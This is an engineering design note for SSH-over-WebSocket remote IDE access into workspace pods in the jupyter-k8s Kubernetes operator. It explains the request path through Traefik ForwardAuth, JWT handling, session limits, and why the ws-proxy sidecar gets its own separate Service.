**Reference for how SSM does it:** `/Users/earaghbi/workplace/jupyter-k8s-aws/charts/aws-hyperpod/templates/hyperpod-access-strategy.yaml`

### How the Pieces Fit Together

```
User (websocat) 
    → wss://workspace.domain.com/ssh-ws [Authorization: Bearer <jwt>]
    → Load Balancer 
    → Traefik (matches IngressRoute, calls ForwardAuth)
    → Auth Middleware (/bearer-auth validates JWT from Authorization header)
    → ws-proxy Service :8080
    → ws-proxy sidecar container (bridges WebSocket ↔ TCP)
    → Remote Access Server localhost:2222
```

### Key Architecture Decisions Made

1. **Connection type is `ssh-over-websocket`** — dedicated type, not reusing `vscode-remote`. Cleaner because WebSocket is IDE-agnostic. Constant: `ConnectionTypeWebSocket` in `api/connection/v1alpha1/workspace_connection_types.go`

2. **Token passed via Authorization header** — websocat uses `-H "Authorization: Bearer <token>"`. Auth middleware extracts from header first, falls back to URL query param for backward compat with web UI.

3. **Token validation only at connection time** — Traefik ForwardAuth runs once on WebSocket upgrade. After that, connection is a raw pipe. Token expiry doesn't interrupt active sessions. (Confirmed: https://community.traefik.io/t/websocket-messages-are-not-routed-through-forward-auth/20660)

4. **ALB idle timeout (60s)** — Mitigated by SSH keepalives (ServerAliveInterval). Traefik readTimeout only applies to HTTP handshake, not WebSocket.

5. **Session lifecycle** — Max duration 12h (matches SSM), ping/pong for dead connection detection, max 10 concurrent connections per pod. Periodic re-validation is scaffolded but not implemented (future work).

6. **No CRD changes** — All existing fields on WorkspaceAccessStrategy are reused (`bearerAuthURLTemplate`, `createConnectionHandler`, `accessResourceTemplates`, `deploymentModifications`)

7. **Service port via accessResourceTemplate** — Creates a separate Service for the proxy (no controller code change). Same pattern as direct SSH service in aws-hyperpod chart.

8. **Separate IngressRoute from web UI** — WebSocket and web UI are independent features. Separate templates allow each to be included or omitted independently.

9. **Custom Go proxy, not websocat, for the sidecar** — Needed for session lifecycle management (max duration, ping/pong, concurrent limits, future revalidation). websocat can't do periodic auth checks or enforce timeouts. websocat is still the client-side tool.

10. **`k8s-native` handler in the `*-remote` default case still works** — For backward compat, if an access strategy maps `vscode-remote: "k8s-native"` in `createConnectionHandlerMap`, it also routes to `generateWebSocketConnectionURL`. Both paths coexist.

**The problem:** The WebSocket proxy sidecar runs inside the workspace pod and listens on port 8080. Traefik needs to route incoming WebSocket connections to this port. But Traefik routes traffic to **Services**, and Services route to **pods**. The workspace's existing Service only exposes port 8888 (JupyterLab web UI). If Traefik tries to send traffic to port 8080, there's no Service mapping for it — the traffic has nowhere to go.

**What we're doing:** Creating a second Kubernetes Service (via the access strategy's `accessResourceTemplates`) that maps port 8080 to the ws-proxy container in the pod. The IngressRoute then points to this Service.

**The flow:**

Without the Service:
```
Traefik → ??? (no Service exposes port 8080) → FAILS
```

With the Service:
```
Traefik → ws-proxy Service (port 8080) → pod's ws-proxy container (port 8080) → localhost:2222
```

**Why not just add port 8080 to the existing Service?** The existing Service is built by the controller's `service_builder.go` and only knows about the workspace spec (port 8888). Modifying it to also include port 8080 would require controller code changes and would expose the proxy port on every workspace, even those not using WebSocket. Using a separate Service created by the access strategy means only workspaces that reference the WebSocket access strategy get the extra Service — and it requires zero code changes.

**Why is this in the access strategy and not the controller?** Because the access strategy already has a mechanism for creating per-workspace Kubernetes resources (`accessResourceTemplates`). The controller renders the template and creates the Service automatically when a workspace references this access strategy. This is the same mechanism that already creates IngressRoutes for web UI routing, and the same way the `aws-hyperpod` chart creates a headless Service for direct SSH.

> **Read this first — before touching any code.**
> This is an open-source, cloud-agnostic alternative to AWS SSM for remote IDE connections (VS Code, Kiro, Cursor) into workspace pods in the `jupyter-k8s` operator. Before starting any task, review the three repos and the reference files listed under **"Repositories — review before starting"** and **"Key reference files"** so you understand the existing patterns.
